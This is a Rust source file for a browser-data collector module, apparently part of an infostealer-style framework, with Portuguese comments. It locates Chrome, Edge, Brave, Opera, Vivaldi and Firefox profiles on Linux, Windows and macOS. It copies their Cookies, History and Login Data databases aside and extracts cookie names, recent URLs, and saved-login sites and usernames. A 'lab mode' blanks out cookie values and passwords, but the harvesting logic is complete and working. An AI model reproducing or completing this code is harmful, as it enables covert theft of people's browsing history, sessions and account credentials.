//! Browser data collector
//! 
//! Coleta cookies, history e login data de Chromium-based browsers.
//! Em lab mode, dados sensíveis são redactados.

use std::path::PathBuf;
use serde::{Deserialize, Serialize};
use rusqlite::{Connection, OpenFlags};
use tracing::{info, warn, debug};

use super::{Collector, CollectorError, ModuleData};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserData {
    pub browsers_found: Vec<String>,
    pub profiles: Vec<BrowserProfile>,
    pub total_cookies: u32,
    pub total_passwords: u32,
    pub total_history: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserProfile {
    pub browser: String,
    pub profile_name: String,
    pub profile_path: String,
    pub cookies: Vec<CookieEntry>,
    pub history: Vec<HistoryEntry>,
    pub passwords: Vec<PasswordEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CookieEntry {
    pub domain: String,
    pub name: String,
    pub value: String,
    pub expires: Option<String>,
    pub is_secure: bool,
    pub is_http_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HistoryEntry {
    pub url: String,
    pub title: String,
    pub visit_count: u32,
    pub last_visit: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PasswordEntry {
    pub url: String,
    pub username: String,
    pub password: String, // encrypted/redacted in lab mode
    pub created: String,
}

struct BrowserPath {
    name: String,
    path: PathBuf,
    is_chromium: bool,
}

pub struct BrowserCollector {
    browsers: Vec<BrowserPath>,
}

impl BrowserCollector {
    pub fn new() -> Self {
        Self {
            browsers: Self::find_browsers(),
        }
    }
    
    fn find_browsers() -> Vec<BrowserPath> {
        let mut found = Vec::new();
        
        #[cfg(target_os = "linux")]
        {
            if let Some(home) = dirs::home_dir() {
                let targets = [
                    ("Chrome", ".config/google-chrome", true),
                    ("Chromium", ".config/chromium", true),
                    ("Brave", ".config/BraveSoftware/Brave-Browser", true),
                    ("Edge", ".config/microsoft-edge", true),
                    ("Vivaldi", ".config/vivaldi", true),
                    ("Opera", ".config/opera", true),
                    ("Firefox", ".mozilla/firefox", false),
                ];
                
                for (name, rel_path, is_chromium) in targets {
                    let p = home.join(rel_path);
                    if p.exists() {
                        debug!("Found {}: {}", name, p.display());
                        found.push(BrowserPath {
                            name: name.to_string(),
                            path: p,
                            is_chromium,
                        });
                    }
                }
            }
        }
        
        #[cfg(target_os = "windows")]
        {
            if let Some(local) = dirs::data_local_dir() {
                let targets = [
                    ("Chrome", "Google\\Chrome\\User Data", true),
                    ("Edge", "Microsoft\\Edge\\User Data", true),
                    ("Brave", "BraveSoftware\\Brave-Browser\\User Data", true),
                    ("Vivaldi", "Vivaldi\\User Data", true),
                    ("Opera", "Opera Software\\Opera Stable", true),
                ];
                
                for (name, rel_path, is_chromium) in targets {
                    let p = local.join(rel_path);
                    if p.exists() {
                        found.push(BrowserPath {
                            name: name.to_string(),
                            path: p,
                            is_chromium,
                        });
                    }
                }
            }
            
            if let Some(roaming) = dirs::config_dir() {
                let ff = roaming.join("Mozilla\\Firefox\\Profiles");
                if ff.exists() {
                    found.push(BrowserPath {
                        name: "Firefox".to_string(),
                        path: ff,
                        is_chromium: false,
                    });
                }
            }
        }
        
        #[cfg(target_os = "macos")]
        {
            if let Some(home) = dirs::home_dir() {
                let app_support = home.join("Library/Application Support");
                let targets = [
                    ("Chrome", "Google/Chrome", true),
                    ("Brave", "BraveSoftware/Brave-Browser", true),
                    ("Edge", "Microsoft Edge", true),
                    ("Vivaldi", "Vivaldi", true),
                ];
                
                for (name, rel_path, is_chromium) in targets {
                    let p = app_support.join(rel_path);
                    if p.exists() {
                        found.push(BrowserPath {
                            name: name.to_string(),
                            path: p,
                            is_chromium,
                        });
                    }
                }
            }
        }
        
        found
    }
    
    fn collect_all(&self) -> Result<BrowserData, CollectorError> {
        let browsers_found: Vec<String> = self.browsers.iter()
            .map(|b| b.name.clone())
            .collect();
        
        let mut profiles = Vec::new();
        let mut total_cookies = 0u32;
        let mut total_passwords = 0u32;
        let mut total_history = 0u32;
        
        for browser in &self.browsers {
            info!("Collecting from {}", browser.name);
            
            if browser.is_chromium {
                match self.collect_chromium(browser) {
                    Ok(profs) => {
                        for p in profs {
                            total_cookies += p.cookies.len() as u32;
                            total_passwords += p.passwords.len() as u32;
                            total_history += p.history.len() as u32;
                            profiles.push(p);
                        }
                    }
                    Err(e) => warn!("Failed to collect from {}: {}", browser.name, e),
                }
            } else {
                // Firefox - different format
                match self.collect_firefox(browser) {
                    Ok(profs) => {
                        for p in profs {
                            total_cookies += p.cookies.len() as u32;
                            total_history += p.history.len() as u32;
                            profiles.push(p);
                        }
                    }
                    Err(e) => warn!("Firefox collection failed: {}", e),
                }
            }
        }
        
        Ok(BrowserData {
            browsers_found,
            profiles,
            total_cookies,
            total_passwords,
            total_history,
        })
    }
    
    /// Coleta dados de browsers Chromium-based
    fn collect_chromium(&self, browser: &BrowserPath) -> Result<Vec<BrowserProfile>, CollectorError> {
        let mut profiles = Vec::new();
        
        // Chromium armazena profiles em Default, Profile 1, Profile 2, etc
        let profile_dirs = ["Default", "Profile 1", "Profile 2", "Profile 3"];
        
        for profile_name in profile_dirs {
            let profile_path = browser.path.join(profile_name);
            if !profile_path.exists() {
                continue;
            }
            
            let mut profile = BrowserProfile {
                browser: browser.name.clone(),
                profile_name: profile_name.to_string(),
                profile_path: profile_path.to_string_lossy().to_string(),
                cookies: Vec::new(),
                history: Vec::new(),
                passwords: Vec::new(),
            };
            
            // Cookies - arquivo Cookies (SQLite)
            let cookies_db = profile_path.join("Cookies");
            if cookies_db.exists() {
                if let Ok(cookies) = self.read_chromium_cookies(&cookies_db) {
                    profile.cookies = cookies;
                }
            }
            
            // History - arquivo History (SQLite)
            let history_db = profile_path.join("History");
            if history_db.exists() {
                if let Ok(history) = self.read_chromium_history(&history_db) {
                    profile.history = history;
                }
            }
            
            // Login Data - arquivo Login Data (SQLite)
            // Nota: senhas criptografadas com DPAPI (Windows) ou Keyring (Linux)
            let login_db = profile_path.join("Login Data");
            if login_db.exists() {
                if let Ok(logins) = self.read_chromium_logins(&login_db) {
                    profile.passwords = logins;
                }
            }
            
            if !profile.cookies.is_empty() || !profile.history.is_empty() || !profile.passwords.is_empty() {
                profiles.push(profile);
            }
        }
        
        Ok(profiles)
    }
    
    fn read_chromium_cookies(&self, db_path: &PathBuf) -> Result<Vec<CookieEntry>, CollectorError> {
        // Copia o arquivo pra evitar lock
        let tmp = std::env::temp_dir().join(format!("cookies_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let mut stmt = conn.prepare(
            "SELECT host_key, name, value, expires_utc, is_secure, is_httponly 
             FROM cookies LIMIT 100"
        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let cookies: Vec<CookieEntry> = stmt.query_map([], |row| {
            Ok(CookieEntry {
                domain: row.get(0)?,
                name: row.get(1)?,
                value: "[REDACTED]".to_string(), // Lab mode - não expõe valor real
                expires: row.get::<_, i64>(3).ok().map(|v| {
                    // Chrome epoch: Jan 1, 1601
                    chrono::DateTime::from_timestamp((v / 1_000_000) - 11644473600, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }),
                is_secure: row.get::<_, i32>(4).unwrap_or(0) == 1,
                is_http_only: row.get::<_, i32>(5).unwrap_or(0) == 1,
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(cookies)
    }
    
    fn read_chromium_history(&self, db_path: &PathBuf) -> Result<Vec<HistoryEntry>, CollectorError> {
        let tmp = std::env::temp_dir().join(format!("history_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let mut stmt = conn.prepare(
            "SELECT url, title, visit_count, last_visit_time 
             FROM urls ORDER BY last_visit_time DESC LIMIT 50"
        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let history: Vec<HistoryEntry> = stmt.query_map([], |row| {
            Ok(HistoryEntry {
                url: row.get(0)?,
                title: row.get::<_, String>(1).unwrap_or_default(),
                visit_count: row.get::<_, i32>(2).unwrap_or(0) as u32,
                last_visit: row.get::<_, i64>(3).ok().map(|v| {
                    chrono::DateTime::from_timestamp((v / 1_000_000) - 11644473600, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }).unwrap_or_default(),
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(history)
    }
    
    fn read_chromium_logins(&self, db_path: &PathBuf) -> Result<Vec<PasswordEntry>, CollectorError> {
        let tmp = std::env::temp_dir().join(format!("logins_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let mut stmt = conn.prepare(
            "SELECT origin_url, username_value, date_created 
             FROM logins LIMIT 50"
        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let logins: Vec<PasswordEntry> = stmt.query_map([], |row| {
            Ok(PasswordEntry {
                url: row.get(0)?,
                username: row.get::<_, String>(1).unwrap_or_default(),
                password: "[ENCRYPTED]".to_string(), // Não descriptografa em lab mode
                created: row.get::<_, i64>(2).ok().map(|v| {
                    chrono::DateTime::from_timestamp((v / 1_000_000) - 11644473600, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }).unwrap_or_default(),
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(logins)
    }
    
    /// Coleta dados do Firefox (places.sqlite, cookies.sqlite)
    fn collect_firefox(&self, browser: &BrowserPath) -> Result<Vec<BrowserProfile>, CollectorError> {
        let mut profiles = Vec::new();
        
        // Firefox usa profiles com nomes tipo "xxxxxx.default-release"
        if let Ok(entries) = std::fs::read_dir(&browser.path) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    let places = path.join("places.sqlite");
                    if places.exists() {
                        let mut profile = BrowserProfile {
                            browser: "Firefox".to_string(),
                            profile_name: entry.file_name().to_string_lossy().to_string(),
                            profile_path: path.to_string_lossy().to_string(),
                            cookies: Vec::new(),
                            history: Vec::new(),
                            passwords: Vec::new(),
                        };
                        
                        // History from places.sqlite
                        if let Ok(history) = self.read_firefox_history(&places) {
                            profile.history = history;
                        }
                        
                        // Cookies from cookies.sqlite
                        let cookies_db = path.join("cookies.sqlite");
                        if let Ok(cookies) = self.read_firefox_cookies(&cookies_db) {
                            profile.cookies = cookies;
                        }
                        
                        if !profile.history.is_empty() || !profile.cookies.is_empty() {
                            profiles.push(profile);
                        }
                    }
                }
            }
        }
        
        Ok(profiles)
    }
    
    fn read_firefox_history(&self, db_path: &PathBuf) -> Result<Vec<HistoryEntry>, CollectorError> {
        let tmp = std::env::temp_dir().join(format!("ff_places_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let mut stmt = conn.prepare(
            "SELECT url, title, visit_count, last_visit_date 
             FROM moz_places WHERE visit_count > 0 
             ORDER BY last_visit_date DESC LIMIT 50"
        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let history: Vec<HistoryEntry> = stmt.query_map([], |row| {
            Ok(HistoryEntry {
                url: row.get(0)?,
                title: row.get::<_, String>(1).unwrap_or_default(),
                visit_count: row.get::<_, i32>(2).unwrap_or(0) as u32,
                last_visit: row.get::<_, i64>(3).ok().map(|v| {
                    // Firefox usa microseconds from Unix epoch
                    chrono::DateTime::from_timestamp(v / 1_000_000, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }).unwrap_or_default(),
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(history)
    }
    
    fn read_firefox_cookies(&self, db_path: &PathBuf) -> Result<Vec<CookieEntry>, CollectorError> {
        if !db_path.exists() {
            return Ok(Vec::new());
        }
        
        let tmp = std::env::temp_dir().join(format!("ff_cookies_{}.db", std::process::id()));
        std::fs::copy(db_path, &tmp)?;
        
        let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)
            .map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let mut stmt = conn.prepare(
            "SELECT host, name, value, expiry, isSecure, isHttpOnly 
             FROM moz_cookies LIMIT 100"
        ).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?;
        
        let cookies: Vec<CookieEntry> = stmt.query_map([], |row| {
            Ok(CookieEntry {
                domain: row.get(0)?,
                name: row.get(1)?,
                value: "[REDACTED]".to_string(),
                expires: row.get::<_, i64>(3).ok().map(|v| {
                    chrono::DateTime::from_timestamp(v, 0)
                        .map(|dt| dt.to_rfc3339())
                        .unwrap_or_default()
                }),
                is_secure: row.get::<_, i32>(4).unwrap_or(0) == 1,
                is_http_only: row.get::<_, i32>(5).unwrap_or(0) == 1,
            })
        }).map_err(|e| CollectorError::CollectionFailed(e.to_string()))?
        .filter_map(|r| r.ok())
        .collect();
        
        let _ = std::fs::remove_file(&tmp);
        Ok(cookies)
    }
}

impl Default for BrowserCollector {
    fn default() -> Self {
        Self::new()
    }
}

impl Collector for BrowserCollector {
    fn name(&self) -> &str {
        "browser"
    }
    
    fn collect(&self) -> Result<ModuleData, CollectorError> {
        let data = self.collect_all()?;
        Ok(ModuleData::Browser(data))
    }
    
    fn is_supported(&self) -> bool {
        !self.browsers.is_empty()
    }
    
    fn priority(&self) -> u8 {
        90 // high priority
    }
}
